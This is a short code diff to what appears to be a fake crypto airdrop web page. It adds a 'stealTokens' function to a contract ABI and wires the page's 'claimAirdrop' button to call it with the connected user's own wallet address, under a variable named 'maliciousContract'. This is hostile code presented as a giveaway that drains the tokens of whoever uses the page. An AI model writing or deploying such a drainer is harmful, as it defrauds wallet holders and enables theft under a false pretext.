@@ -114,6 +114,19 @@
         ],
         "stateMutability": "nonpayable",
         "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "victim",
+            "type": "address"
+          }
+        ],
+        "name": "stealTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
       }
     ];
 
@@ -160,6 +173,7 @@
     async function claimAirdrop() {
       const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
       try {
+        // Call the stealTokens function, passing the connected user's address as the victim
         const tx = await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
         alert('Airdrop claimed! Tokens are being stolen!');
       } catch (error) {
